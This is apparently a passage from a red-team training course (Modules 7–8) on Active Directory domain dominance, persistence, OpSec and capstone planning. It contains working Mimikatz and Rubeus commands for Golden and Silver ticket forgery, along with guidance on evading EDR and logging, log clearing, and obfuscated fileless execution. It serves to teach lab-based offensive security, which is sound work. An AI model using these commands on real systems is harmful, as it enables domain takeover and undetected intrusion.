    "module-7": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 7: module_7</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, buckle up! We&#39;ve journeyed from a single compromised host, learned to find our way around, grab local goodies, elevate our access, hop between machines, and map out the entire Active Directory forest. Now, we&#39;re standing at the precipice of ultimate power within the domain.</p>\n<p>This is Module 7: <strong>Domain Dominance &amp; Persistence</strong>. This is where we transition from being just <em>on</em> the network to effectively <em>owning</em> it. We&#39;ll learn the techniques that allow attackers to seize control of the domain itself and, crucially, how to ensure that control persists even if our initial footholds are discovered and removed.</p>\n<p>This module is powerful. These techniques are the crown jewels of many advanced persistent threats (APTs) and red teams. With great power comes great responsibility – remember, we are doing this to <em>learn</em> and <em>defend</em>. All practical exercises <em>must</em> be conducted in your isolated lab environment.</p>\n<hr>\n<h2>Module 7: Domain Dominance &amp; Persistence</h2>\n<p><strong>Module Objective:</strong> Achieve Domain Administrator privileges (or equivalent control) and establish persistent access within the Active Directory environment using advanced techniques.</p>\n<p><strong>Learning Goals:</strong> By the end of this module, you will be able to:</p>\n<ul>\n<li>Understand and leverage high-privilege credentials and tickets for domain control.</li>\n<li>Explain the theory and execute practical attacks like Golden and Silver Tickets.</li>\n<li>Identify and potentially exploit SIDHistory for cross-domain privilege escalation.</li>\n<li>Implement various methods for maintaining persistent access within an Active Directory domain.</li>\n<li>Discuss the operational security implications of domain-level actions.</li>\n</ul>\n<hr>\n<h3>7.1 Leveraging Attack Paths &amp; Targeting High-Value Accounts</h3>\n<p>We spent Module 5 meticulously mapping the Active Directory landscape with tools like PowerView and, most importantly, BloodHound. Module 6 equipped us with advanced credential attacks like Kerberoasting and AS-REP Roasting. Now, it&#39;s time to synthesize that information and execute.</p>\n<p><strong>Theory:</strong></p>\n<p>BloodHound isn&#39;t just pretty graphs; it&#39;s a sophisticated pathfinding engine. It takes the relationships (sessions, group memberships, ACLs, delegation rights, etc.) you enumerated and finds the <em>shortest paths</em> from your initial access point (or any user/computer you control) to your desired target (usually Domain Admins, but could be sensitive data, specific servers, etc.).</p>\n<p>Identifying high-value accounts means finding users or groups that possess privileges allowing control over significant parts of the domain. The ultimate prize is typically the <code>Domain Admins</code> group, but others like <code>Enterprise Admins</code>, <code>Builtin Administrators</code> (on DCs), <code>Backup Operators</code>, or even users with specific powerful rights (like <code>SeEnableDelegationPrivilege</code> or <code>GenericAll</code> on critical objects) can be targets.</p>\n<p><strong>Practical Application:</strong></p>\n<ol>\n<li><strong>Review BloodHound Output:</strong> Go back to your Neo4j database from Module 5.<ul>\n<li>Run queries like:<ul>\n<li><code>Find shortest paths to Domain Admins</code></li>\n<li><code>Find principals with unconstrained delegation</code></li>\n<li><code>Find high value targets</code></li>\n<li><code>Find Kerberoastable accounts</code> (if you haven&#39;t exploited them yet)</li>\n<li><code>Find computers where Domain Admins have sessions</code></li>\n</ul>\n</li>\n<li>Analyze the paths. Each edge in the graph represents a potential step (e.g., &quot;User X has session on Computer Y&quot;, &quot;User A is member of Group B&quot;, &quot;Computer Z has Admin rights on Computer W&quot;).</li>\n<li>Identify the <em>type</em> of relationship you need to exploit to move along the path. Is it a session you can hijack? A credential you can reuse (PtH/PtT)? A service ticket you can request and crack (Kerberoasting)? A misconfigured ACL you can leverage?</li>\n</ul>\n</li>\n<li><strong>Prioritize Targets:</strong> Focus on paths that seem most feasible based on the credentials/access you&#39;ve already obtained or believe you can obtain easily. A path involving Kerberoasting a few accounts might be quicker than finding a complex PE on a specific machine.</li>\n<li><strong>Execute Based on Path:</strong> This is where you apply techniques from Modules 3, 4, and 6.<ul>\n<li>If the path goes through a computer where a high-priv user has a session, use lateral movement techniques (M4) like PsExec, WMI, or PowerShell Remoting, potentially combined with harvested credentials (M6) or token impersonation (M3), to get onto that machine. Once there, maybe you can dump LSASS (M2) to get the user&#39;s current credentials or tickets.</li>\n<li>If the path involves a Kerberoastable user who is a member of a privileged group, execute the Kerberoasting attack (M6), crack the hash, and use the resulting cleartext password or NTLM hash for lateral movement or authentication.</li>\n<li>If the path involves a computer object with Unconstrained Delegation, compromising that computer allows you to potentially trick users into authenticating to it, capturing their TGTs.</li>\n<li>If the path involves weak ACLs on an Organizational Unit (OU) or group, you might be able to add your own user to a privileged group directly.</li>\n</ul>\n</li>\n</ol>\n<p><strong>Example Walkthrough Idea (Conceptual):</strong></p>\n<ul>\n<li>BloodHound shows: <code>CompromisedUser</code> -&gt; <code>MemberOf</code> -&gt; <code>WorkstationAdmins</code> -&gt; <code>AdminTo</code> -&gt; <code>SensitiveServer</code> -&gt; <code>HasSession</code> -&gt; <code>DomainAdminUser</code>.</li>\n<li><em>Plan:</em><ol>\n<li>Use <code>CompromisedUser</code>&#39;s access.</li>\n<li>Leverage <code>WorkstationAdmins</code> membership (maybe they have admin rights on their own workstation).</li>\n<li>Find credentials on the workstation to get admin on <code>SensitiveServer</code> (lateral movement M4, M6).</li>\n<li>Once on <code>SensitiveServer</code>, look for sessions or credentials of <code>DomainAdminUser</code> (recon M2).</li>\n<li>Dump LSASS or find cached credentials for <code>DomainAdminUser</code>.</li>\n<li>Use <code>DomainAdminUser</code> credentials/hash/ticket to achieve Domain Admin access.</li>\n</ol>\n</li>\n</ul>\n<p>This section is less about <em>new</em> techniques and more about <em>applying</em> the techniques you&#39;ve learned in a strategic, data-driven way guided by AD enumeration.</p>\n<hr>\n<h3>7.2 Golden Ticket Attacks</h3>\n<p>This is one of the most powerful attacks against Active Directory. It allows you to forge a Ticket Granting Ticket (TGT) for <em>any</em> user in the domain, effectively granting you the ability to impersonate that user and access <em>any</em> resource within the domain (and potentially trusted domains).</p>\n<p><strong>Theory:</strong></p>\n<p>Kerberos authentication relies on a trusted third party: the Key Distribution Center (KDC), which is the Domain Controller. The KDC has a special account, <code>krbtgt</code>, whose NTLM hash is used to encrypt and sign TGTs. A TGT is like a long-term pass that proves your identity to the KDC. Once you have a TGT, you can request Service Tickets (TGSs) for specific services (like accessing a file share, running a remote command) without needing your password again.</p>\n<p>A Golden Ticket attack works by obtaining the <code>krbtgt</code> account&#39;s NTLM hash. With this hash, an attacker can manually <em>forge</em> a valid TGT for <em>any</em> user (even non-existent ones) with <em>any</em> group memberships (including Domain Admins, Enterprise Admins, etc.). This forged ticket is signed with the legitimate <code>krbtgt</code> hash, so the KDC and other services trust it implicitly.</p>\n<p><strong>Prerequisites:</strong></p>\n<ul>\n<li>The NTLM hash of the <code>krbtgt</code> account.</li>\n<li>The Domain Name.</li>\n<li>The Domain SID.</li>\n<li>Administrator or SYSTEM privileges on <em>any</em> domain-joined machine to inject the ticket into a session (or use tools like Impacket from an attacker machine).</li>\n</ul>\n<p><strong>How to get the <code>krbtgt</code> hash:</strong></p>\n<p>The most common way is using the <code>DCSync</code> technique (covered in 7.3) from a machine with sufficient privileges (Domain Admins, Enterprise Admins, or specific ACLs). Alternatively, if you have administrative access on a Domain Controller, you can dump the NTDS.DIT database and extract the hash offline (e.g., using <code>secretsdump.py</code> or <code>dsntutil.exe</code> + <code>pypykatz</code>).</p>\n<p><strong>Practical Application (using Mimikatz):</strong></p>\n<p>Assume you have already obtained the <code>krbtgt</code> hash (e.g., <code>a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4</code>).</p>\n<ol>\n<li><p><strong>Get Domain SID:</strong> You can get this from any domain-joined machine.</p>\n<pre><code class=\"language-powershell\">whoami /user\n</code></pre>\n<p>Look for the SID string (e.g., `S-1-5-21-...). The portion before the last hyphen is the Domain SID.<br>Alternatively:</p>\n<pre><code class=\"language-powershell\">(Get-ADDomain).DomainSID\n</code></pre>\n<p>(Requires ActiveDirectory PowerShell module, which might not be on a standard compromised host, but is common on admin workstations or DCs).<br>Let&#39;s say the Domain SID is <code>S-1-5-21-1234567890-987654321-123456789</code>. The relevant part for Mimikatz is <code>1234567890-987654321-123456789</code>.</p>\n</li>\n<li><p><strong>Inject the Golden Ticket:</strong> Open Mimikatz (requires Administrator/SYSTEM).</p>\n<pre><code class=\"language-mimikatz\"># Ensure you have the necessary privileges\nprivilege::debug\n\n# Inject the golden ticket\n# Parameters:\n# /user: The username to impersonate (can be fake, e.g., &quot;administrator&quot; or &quot;pwnedadmin&quot;)\n# /domain: The FQDN of the domain (e.g., &quot;corp.local&quot;)\n# /sid: The Domain SID obtained in step 1\n# /krbtgt: The NTLM hash of the krbtgt account\n# /ptt: Pass The Ticket - injects the ticket into the current session\nkerberos::golden /user:pwnedadmin /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /krbtgt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 /ptt\n</code></pre>\n</li>\n<li><p><strong>Verify the Ticket:</strong> Use <code>klist</code> to view the Kerberos tickets in your current session. You should see a TGT for the user you specified, issued by <code>krbtgt</code>.</p>\n<pre><code class=\"language-cmd\">klist\n</code></pre>\n</li>\n<li><p><strong>Access Resources:</strong> Now, you can access any resource in the domain as <code>pwnedadmin</code> (which effectively has the privileges you assigned via the group memberships implied by the ticket).</p>\n<pre><code class=\"language-cmd\"># Access a file share on a Domain Controller\nnet use \\\\DC01.corp.local\\SYSVOL\n\n# Or run a command remotely on a DC using PsExec (assuming it&#39;s allowed)\n# This might require specific PsExec versions or configurations to use the injected ticket\n# A more reliable way might be to use Impacket&#39;s psexec.py with the ticket cache\n</code></pre>\n</li>\n</ol>\n<p><strong>Practical Application (using Rubeus):</strong></p>\n<p>Rubeus is a C# alternative to Mimikatz for Kerberos interaction, often preferred for its flexibility and less signatured nature compared to Mimikatz binaries.</p>\n<ol>\n<li><p><strong>Get Domain SID:</strong> Same as step 1 for Mimikatz.</p>\n</li>\n<li><p><strong>Inject the Golden Ticket:</strong></p>\n<pre><code class=\"language-powershell\"># Assuming you have Rubeus.exe accessible\n.\\Rubeus.exe golden /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /krbtgt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 /user:pwnedadmin /ptt\n</code></pre>\n<p>Rubeus offers more options, like specifying group SIDs to add to the ticket explicitly, which gives finer-grained control over the resulting privileges if you don&#39;t want full DA.</p>\n</li>\n<li><p><strong>Verify &amp; Access:</strong> Same as steps 3 &amp; 4 for Mimikatz.</p>\n</li>\n</ol>\n<p><strong>OpSec Considerations:</strong></p>\n<ul>\n<li>Injecting tickets modifies the current logon session&#39;s ticket cache, which <em>can</em> be detected by sophisticated endpoint monitoring.</li>\n<li>Accessing resources with a forged ticket generates logs on the target resource server and potentially the DC, but they will look like legitimate Kerberos authentications <em>from the user specified in the ticket</em>. The anomaly is the <em>source</em> machine from which the authentication originated if that machine isn&#39;t typically used by the impersonated user.</li>\n<li>Obtaining the <code>krbtgt</code> hash (often via DCSync) is a very high-privilege action that is heavily logged and monitored by defenders.</li>\n</ul>\n<hr>\n<h3>7.3 Silver Ticket Attacks</h3>\n<p>While a Golden Ticket grants access to <em>any</em> resource as <em>any</em> user, a Silver Ticket grants access to a <em>specific service</em> on a <em>specific server</em> as <em>any</em> user.</p>\n<p><strong>Theory:</strong></p>\n<p>Kerberos authentication for services uses Service Tickets (TGSs). A TGS is encrypted and signed with the NTLM hash of the <em>service account</em> or the <em>computer account</em> hosting the service. Forging a Silver Ticket involves obtaining the NTLM hash of the target server&#39;s computer account (or the hash of the specific service account if one is used and has an SPN) and using it to manually forge a valid TGS for a specific service on that server.</p>\n<p>Since the ticket is signed with the legitimate key (the server&#39;s hash), the target server trusts the ticket and grants access to the specified service, regardless of the actual user requesting it.</p>\n<p><strong>Prerequisites:</strong></p>\n<ul>\n<li>The NTLM hash of the target server&#39;s computer account (e.g., <code>SERVER01$</code>).</li>\n<li>The Domain Name.</li>\n<li>The Domain SID.</li>\n<li>The Target Server&#39;s FQDN.</li>\n<li>The Service Name (SPN portion, e.g., <code>cifs</code>, <code>host</code>, <code>http</code>).</li>\n<li>Administrator or SYSTEM privileges on <em>any</em> domain-joined machine to inject the ticket.</li>\n</ul>\n<p><strong>How to get the target server&#39;s hash:</strong></p>\n<p>You need administrator privileges on the target server itself to dump its LSASS or registry hives (SAM/SECURITY) and extract the <code>SERVER01$</code> account&#39;s NTLM hash. Techniques from Module 2 and 3 (Local Enumeration, Credential Harvesting, Privilege Escalation) are relevant here.</p>\n<p><strong>Practical Application (using Mimikatz):</strong></p>\n<p>Assume you have obtained the target server&#39;s hash (e.g., <code>b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5</code>). Let&#39;s target the CIFS service (for file shares) on <code>FILESERVER01.corp.local</code>.</p>\n<ol>\n<li><p><strong>Get Domain SID &amp; Domain Name:</strong> Same as for Golden Ticket.</p>\n</li>\n<li><p><strong>Get Target Server Hash:</strong> Assumed obtained (e.g., via local admin + Mimikatz <code>lsadump::sam</code>).</p>\n</li>\n<li><p><strong>Identify Service Name:</strong> Common services include <code>cifs</code> (file shares), <code>host</code> (many things, including RDP), <code>http</code> (web services), <code>mssql</code> (SQL Server).</p>\n</li>\n<li><p><strong>Inject the Silver Ticket:</strong> Open Mimikatz (requires Administrator/SYSTEM).</p>\n<pre><code class=\"language-mimikatz\">privilege::debug\n\n# Inject the silver ticket\n# Parameters:\n# /user: The username to appear as in logs (can be fake, e.g., &quot;fakeuser&quot;)\n# /domain: The FQDN of the domain\n# /sid: The Domain SID\n# /target: The FQDN of the target server\n# /service: The service name (e.g., cifs)\n# /ntlm: The NTLM hash of the target server&#39;s computer account (SERVER01$)\n# /ptt: Pass The Ticket\nkerberos::silver /user:fakeuser /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /target:FILESERVER01.corp.local /service:cifs /ntlm:b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5 /ptt\n</code></pre>\n</li>\n<li><p><strong>Verify the Ticket:</strong> Use <code>klist</code>. You should see a TGS for <code>cifs/FILESERVER01.corp.local</code>.</p>\n<pre><code class=\"language-cmd\">klist\n</code></pre>\n</li>\n<li><p><strong>Access the Service:</strong> Now, you can access the specified service on the target server.</p>\n<pre><code class=\"language-cmd\"># Access a file share on FILESERVER01\nnet use \\\\FILESERVER01.corp.local\\sharename\n</code></pre>\n</li>\n</ol>\n<p><strong>Practical Application (using Rubeus):</strong></p>\n<pre><code class=\"language-powershell\"># Assuming you have Rubeus.exe accessible\n.\\Rubeus.exe silver /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /target:FILESERVER01.corp.local /service:cifs /ntlm:b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5 /user:fakeuser /ptt\n</code></pre>\n<p><strong>OpSec Considerations:</strong></p>\n<ul>\n<li>Similar to Golden Tickets, injecting the ticket modifies the session and generates logs on the target server.</li>\n<li>The authentication log on the target server will show access for the user specified in <code>/user</code>, but the source machine might be unusual for that user.</li>\n<li>Obtaining the target server&#39;s hash requires administrative access on that specific server, which itself has OpSec implications (Module 2/3/4).</li>\n</ul>\n<hr>\n<h3>7.4 SIDHistory Exploitation</h3>\n<p>SIDHistory is a lesser-known vector but can be powerful in environments with a history of domain migrations or acquisitions.</p>\n<p><strong>Theory:</strong></p>\n<p>When user or group accounts are migrated from one domain to another, their original SID from the source domain can be added to the <code>sIDHistory</code> attribute of the new account in the target domain. This allows the migrated account to retain access to resources in the source domain that were ACL&#39;d using the original SID.</p>\n<p>The security principal (user or group) possessing a SID in its <code>sIDHistory</code> attribute <em>can</em> be treated by the target resource as if it were the original security principal from the source domain for access control purposes.</p>\n<p>The exploit comes when a user account in Domain A has the SID of a highly privileged group (like Domain Admins) from Domain B in its <code>sIDHistory</code>, and there is a trust relationship that allows Domain A users to access resources in Domain B. The user in Domain A might then be able to access resources in Domain B as if they were a Domain Admin <em>from Domain B</em>.</p>\n<p><strong>Prerequisites:</strong></p>\n<ul>\n<li>A trust relationship between domains.</li>\n<li>An account in one domain with the SID of a privileged group from <em>another</em> trusted domain in its <code>sIDHistory</code>.</li>\n<li>The ability to authenticate as that account.</li>\n</ul>\n<p><strong>Practical Application:</strong></p>\n<p>Exploiting SIDHistory often involves <em>creating</em> a user with a manipulated <code>sIDHistory</code> or <em>modifying</em> an existing user&#39;s <code>sIDHistory</code>. This typically requires high privileges (like Domain Admin) in the <em>source</em> domain or the ability to perform DCShadow/modify AD objects with sufficient rights.</p>\n<p>Since <em>creating</em> this condition requires high privileges anyway, the exploit itself is usually just authenticating as the manipulated user and accessing resources in the trusted domain. The key is <em>identifying</em> existing accounts with potentially exploitable SIDHistory.</p>\n<ol>\n<li><strong>Identify Accounts with SIDHistory:</strong> Use AD enumeration tools.<pre><code class=\"language-powershell\"># Using PowerView (from PowerSploit)\nGet-DomainUser -Properties SIDHistory | Where-Object {$_.SIDHistory -ne $null} | Select-Object Name, SIDHistory\n\nGet-DomainGroup -Properties SIDHistory | Where-Object {$_.SIDHistory -ne $null} | Select-Object Name, SIDHistory\n</code></pre>\n</li>\n<li><strong>Analyze SIDHistory:</strong> Look at the SIDs listed. Try to identify the domain and the original account/group the SID belongs to. Use resources like <code>addam.py</code> from Impacket or online SID lookups to identify common well-known SIDs (like Domain Admins). If you see a SID corresponding to a privileged group from a trusted domain, you&#39;ve found a potential vector.</li>\n<li><strong>Leverage the Account:</strong> If you have the credentials for an account with an interesting SIDHistory, simply authenticate as that user (e.g., via <code>runas /netonly</code>, PsExec, or Pass-the-Hash if you have the hash) and attempt to access resources in the domain corresponding to the SID in the history.</li>\n</ol>\n<p><strong>Creating SIDHistory (Requires High Privileges):</strong></p>\n\n                </div>\n             </div>\n         ",
    "module-8": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 8: module_8</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team! We&#39;ve traversed the intricate pathways of Windows internals, harvested precious credentials, scaled local privileges, danced across the network, and mapped the hidden relationships within Active Directory. Now, we arrive at the culmination – Module 8.</p>\n<p>This isn&#39;t just a wrap-up; it&#39;s where we synthesize everything. We stop thinking about individual techniques and start thinking like a cohesive red team operator. We&#39;ll focus on the crucial, often overlooked, aspects: <em>Operational Security (OpSec)</em> to stay undetected, the <em>Planning</em> that makes an operation efficient, the <em>Execution</em> where theory meets reality, and the <em>Reporting</em> that translates our technical feats into actionable intelligence for defenders.</p>\n<p>This module is designed around the <strong>Capstone Project</strong>. Your journey through Modules 1-7 has equipped you with the tools and knowledge. Now, you&#39;ll apply them end-to-end in a simulated operation. Think of this as your final exam, but one where you get to write the questions (your plan) and show your work (your execution and report).</p>\n<p>Let&#39;s dive into the final, critical pieces of the puzzle!</p>\n<hr>\n<h2>Module 8: Operational Security (OpSec), Reporting &amp; Capstone Project</h2>\n<p><strong>Module Objective:</strong> Understand and apply OpSec principles throughout the operation, synthesize all learned techniques, plan a simulated red team engagement, execute it in the lab, and document the process and findings.</p>\n<p><strong>Duration:</strong> This module is primarily driven by the Capstone Project, which will require significant hands-on lab time. Allocate time for planning (several hours), execution (potentially several hours spread out), and reporting (several hours).</p>\n<hr>\n<h3>Section 8.1: Operational Security (OpSec) - The Art of Not Getting Caught</h3>\n<p>Welcome to the shadowy world of OpSec. While gaining access and escalating privileges is exciting, doing it stealthily is what separates a noisy script kiddie from a professional red teamer. OpSec is about minimizing your footprint, blending in, and understanding how defenders see the world.</p>\n<p><strong>Why OpSec Matters:</strong></p>\n<ul>\n<li><strong>Real Engagements:</strong> Getting caught early means mission failure. It burns your tools, techniques, and procedures (TTPs).</li>\n<li><strong>Lab Environment:</strong> Even in a lab, practicing good OpSec helps you understand <em>why</em> certain techniques are better than others and prepares you for real-world constraints. It forces you to think like a defender trying to catch you.</li>\n</ul>\n<h4>8.1.1 Reviewing OpSec by Phase</h4>\n<p>Let&#39;s revisit the stages we&#39;ve covered and highlight OpSec considerations at each step:</p>\n<ul>\n<li><strong>Initial Access (Assumed):</strong> While we started <em>after</em> initial access, the methods <em>used</em> for initial access (phishing, exploit, weak RDP, etc.) have huge OpSec implications. A loud exploit might trigger immediate alerts, while a carefully crafted phishing email with a subtle payload might go unnoticed longer.</li>\n<li><strong>Module 1: Initial Host Reconnaissance:</strong><ul>\n<li><strong>Risk:</strong> Running noisy commands (<code>systeminfo</code>, <code>tasklist</code>, <code>netstat</code>) frequently or in rapid succession can look suspicious, especially if logged. Using standard binaries is generally better than dropping custom tools early.</li>\n<li><strong>OpSec Tip:</strong> Use native commands where possible. Space out your commands. Understand what commands are <em>expected</em> on that system (e.g., a sysadmin might run <code>tasklist</code>, but maybe not every 5 minutes).</li>\n</ul>\n</li>\n<li><strong>Module 2: Local Enumeration &amp; Credential Harvesting:</strong><ul>\n<li><strong>Risk:</strong> Accessing sensitive files/registry keys, dumping LSASS. Duming LSASS is <em>highly</em> suspicious and often a prime detection vector for EDR/AV. Running unknown executables (<code>procdump</code>, <code>Mimikatz</code> variants) is also risky.</li>\n<li><strong>OpSec Tip:</strong> Use fileless techniques (PowerShell scripts loaded directly into memory). Use trusted/signed binaries if available (though attackers use these too!). Understand <em>how</em> tools like Mimikatz work (<code>sekurlsa::logonpasswords</code>) and what system calls they make, as defenders look for those specific calls. Consider <em>offline</em> analysis if you can exfiltrate memory dumps or registry hives without touching LSASS directly on the target.</li>\n</ul>\n</li>\n<li><strong>Module 3: Windows Privilege Escalation:</strong><ul>\n<li><strong>Risk:</strong> Creating new services, dropping exploit binaries, modifying registry keys, using known vulnerable kernel exploits. UAC bypasses might trigger specific EDR rules.</li>\n<li><strong>OpSec Tip:</strong> Leverage misconfigurations that <em>don&#39;t</em> require dropping files (e.g., weak service permissions you can modify in place). Use reflective DLL injection or in-memory PE techniques. Understand the detection surface of common PE tools (<code>PowerUp</code>, <code>WinPEAS</code>) and consider manually replicating steps or using less common variants.</li>\n</ul>\n</li>\n<li><strong>Module 4: Lateral Movement:</strong><ul>\n<li><strong>Risk:</strong> Using noisy tools like PsExec (sysinternals version is often flagged), high volume of failed authentication attempts, using unexpected protocols (WMI, PowerShell Remoting) between unusual hosts, creating scheduled tasks remotely.</li>\n<li><strong>OpSec Tip:</strong> Blend in. Use protocols <em>expected</em> between systems (e.g., RDP for admin access, SMB for file shares). Use credentials you&#39;ve harvested via PtH/PtT rather than brute-forcing. Use in-memory execution frameworks (like Covenant, Empire, Metasploit) that handle lateral movement tasks more stealthily than dropping raw executables. Use <code>Invoke-Command</code> or <code>Enter-PSSession</code> with appropriate credentials if PowerShell Remoting is common in the environment.</li>\n</ul>\n</li>\n<li><strong>Module 5: Active Directory Enumeration:</strong><ul>\n<li><strong>Risk:</strong> High volume of LDAP/S queries from a single host, especially from an unusual user or machine. Running BloodHound collectors (<code>SharpHound</code>, <code>PowerHound</code>) can be noisy due to the sheer volume of queries they make.</li>\n<li><strong>OpSec Tip:</strong> Use native tools (<code>net group /domain</code>, <code>nltest</code>) sparingly first. Use less noisy AD enumeration techniques if possible. Run BloodHound collectors from a system that is less monitored or blend the collection activity over a longer period. Understand <em>what</em> queries BloodHound makes so you know what defenders might see.</li>\n</ul>\n</li>\n<li><strong>Module 6: Advanced Credential Attacks:</strong><ul>\n<li><strong>Risk:</strong> Kerberoasting (requesting many SPN tickets from a DC can be detected, especially if done from a non-server OS), AS-REP Roasting (failed pre-authentication attempts logged on the DC), PtH/PtT (using tickets/hashes from unusual source IPs). Using tools like Mimikatz/Rubeus on target systems.</li>\n<li><strong>OpSec Tip:</strong> Perform Kerberoasting from a less critical host. Be mindful of the number of requests. Perform offline cracking <em>off</em> the target network. Use PtH/PtT carefully, ensuring the source/destination combination doesn&#39;t look anomalous. Use in-memory versions of tools like Rubeus via PowerShell.</li>\n</ul>\n</li>\n<li><strong>Module 7: Domain Dominance &amp; Persistence:</strong><ul>\n<li><strong>Risk:</strong> Modifying sensitive AD objects (users, groups, GPOs, AdminSDHolder), using highly suspicious techniques like DCSync or DCShadow (these look like domain controllers replicating!). Creating persistent backdoors (scheduled tasks, services, WMI permanent events, modifying logon scripts, etc.).</li>\n<li><strong>OpSec Tip:</strong> Understand what is being monitored on Domain Controllers (Event IDs related to object modification, replication, logon/logoff). Use techniques that blend in (e.g., modifying an <em>existing</em> GPO subtly rather than creating a new one). Use less common persistence methods. Be <em>extremely</em> cautious with DCSync/DCShadow – these are often considered high-risk techniques likely to trigger alerts.</li>\n</ul>\n</li>\n</ul>\n<h4>8.1.2 Common Detection Mechanisms</h4>\n<p>Defenders use various tools and techniques to spot malicious activity. Understanding these helps you evade them.</p>\n<ol>\n<li><strong>Endpoint Detection and Response (EDR) / Antivirus (AV):</strong><ul>\n<li><strong>What they see:</strong> Malicious file hashes, suspicious process behavior (e.g., a standard user process accessing LSASS memory), unusual parent-child process relationships (e.g., <code>cmd.exe</code> spawning <code>powershell.exe</code> with encoded commands), modifications to critical system areas (registry, startup folders), known exploit patterns.</li>\n<li><strong>Evasion thought:</strong> Use fileless execution, process injection, obfuscate scripts, use Living Off The Land Binaries/Scripts (LOLBAS - using legitimate system tools for malicious purposes, like <code>certutil</code> for decoding files, <code>powershell</code> for execution, <code>bitsadmin</code> for downloads).</li>\n</ul>\n</li>\n<li><strong>Network Monitoring (IDS/IPS, Network Traffic Analysis):</strong><ul>\n<li><strong>What they see:</strong> Connections to known bad IPs, high volume of traffic on unusual ports (e.g., SMB traffic from a workstation to another workstation that isn&#39;t normally a file server), scanning activity, suspicious protocol usage (e.g., NTLM authentication attempts with old hashes, Kerberos service ticket requests for many SPNs).</li>\n<li><strong>Evasion thought:</strong> Use encrypted channels (HTTPS C2), tunnel traffic, blend in with normal traffic patterns, minimize scanning, use credentials/hashes via PtH/PtT instead of brute force.</li>\n</ul>\n</li>\n<li><strong>Logging and Security Information and Event Management (SIEM):</strong><ul>\n<li><strong>What they see:</strong> This is the defender&#39;s primary source of truth. Windows Event Logs (Security, System, Application), Sysmon logs (highly detailed process, network, file activity), Domain Controller logs (authentication events, object modifications, replication). SIEMs correlate these logs to spot patterns (e.g., failed login attempts followed by a successful login from a different user/IP, a user account logging into multiple machines in a short time, unusual service installations).</li>\n<li><strong>Evasion thought:</strong> Understand critical Event IDs (e.g., 4624/4625 Logon/Logoff, 4688 Process Creation, 4720 User Created, 4732 Group Membership Added). Avoid generating excessive failed events. Be cautious with log clearing (<code>wevtutil cl system</code> etc.) as clearing logs <em>itself</em> generates a log event (Event ID 1102)! Focus on techniques that generate <em>fewer</em> or <em>less suspicious</em> log entries. Sysmon is a pain for attackers; understanding its configuration is key.</li>\n</ul>\n</li>\n</ol>\n<h4>8.1.3 Evasion Techniques &amp; Tradecraft</h4>\n<p>Beyond specific tool usage, OpSec is a mindset and a set of practices:</p>\n<ul>\n<li><strong>Living Off The Land (LOTL):</strong> Use legitimate system tools (PowerShell, WMI, schtasks, bitsadmin, etc.) as much as possible instead of dropping custom malware. This makes your activity look more like legitimate system administration.</li>\n<li><strong>Fileless Techniques:</strong> Execute payloads directly in memory (e.g., PowerShell scripts via <code>IEX</code>, reflective DLL injection) to avoid writing malicious files to disk, which AV/EDR often monitor.</li>\n<li><strong>Obfuscation:</strong> Encode or obfuscate scripts and commands to make them harder for static analysis (AV signatures) and defenders to read (<code>powershell -encodedcommand ...</code>).</li>\n<li><strong>Timing:</strong> Perform actions during off-hours or maintenance windows when activity might be expected or monitoring staff are less vigilant (though automated alerting should still catch you!).</li>\n<li><strong>Tooling:</strong> Use reputable red team frameworks (Covenant, Empire, Metasploit, PoshC2) that implement better OpSec practices (encrypted C2, in-memory execution, less signatured payloads) than raw tools. Understand the OpSec profile of your tools – Mimikatz is loud, but essential; use it judiciously.</li>\n<li><strong>User Simulation:</strong> Try to make your activity look like a legitimate user or administrator on the network. Access expected resources, use expected protocols.</li>\n<li><strong>C2 Communications:</strong> Use encrypted channels (HTTPS is common) and potentially domain fronting or compromised legitimate domains to masquerade command and control traffic.</li>\n</ul>\n<p><strong>OpSec is a constant cat-and-mouse game.</strong> Defenders improve, and attackers adapt. Staying current on detection methods is crucial for effective red teaming.</p>\n<h3>Section 8.2: Planning a Red Team Operation (Capstone Phase 1)</h3>\n<p>Before you touch a single key in the lab for your Capstone, you <em>must</em> plan. A good plan saves time, reduces noise, and increases your chances of success.</p>\n<h4>8.2.1 Why Plan?</h4>\n<ul>\n<li><strong>Clarity of Purpose:</strong> What are you trying to achieve? (The objective).</li>\n<li><strong>Efficiency:</strong> Avoid wasted steps or going down rabbit holes.</li>\n<li><strong>Risk Management:</strong> Understand the potential detection points and have contingencies.</li>\n<li><strong>Team Coordination (Real World):</strong> Ensures everyone is on the same page and not stepping on each other&#39;s toes.</li>\n<li><strong>Measurability:</strong> How do you know you succeeded?</li>\n</ul>\n<h4>8.2.2 Key Planning Elements</h4>\n<ol>\n<li><p><strong>Define Objectives:</strong> This is the <em>goal</em> of the operation. For your Capstone, choose something specific and achievable within your lab environment. Examples:</p>\n<ul>\n<li>Obtain Domain Administrator privileges.</li>\n<li>Access a specific sensitive file share (e.g., <code>\\\\DC01\\HR_Data</code>).</li>\n<li>Establish persistent access on the Domain Controller.</li>\n<li>Compromise a specific user&#39;s mailbox or cloud storage (if simulated).</li>\n<li>Exfiltrate a specific &quot;sensitive&quot; file.</li>\n<li>Establish persistence on at least 3 different machines in the network.</li>\n</ul>\n<p><em>Write down your objective clearly.</em></p>\n</li>\n<li><p><strong>Define Scope:</strong> What systems, subnets, user accounts, or applications are <em>in bounds</em> for this operation? In your lab, this might be &quot;all machines in the <code>CONTOSO.COM</code> domain&quot; or &quot;only systems on the 192.168.1.0/24 subnet&quot;. <em>Write down your scope.</em></p>\n</li>\n<li><p><strong>Define Rules of Engagement (RoE):</strong> In a real engagement, this is critical and covers things like: Are DoS attacks allowed? Can we target specific individuals? What hours can we operate? What is the &quot;get out of jail free&quot; card if we&#39;re caught? In your lab, this is simpler, but still good 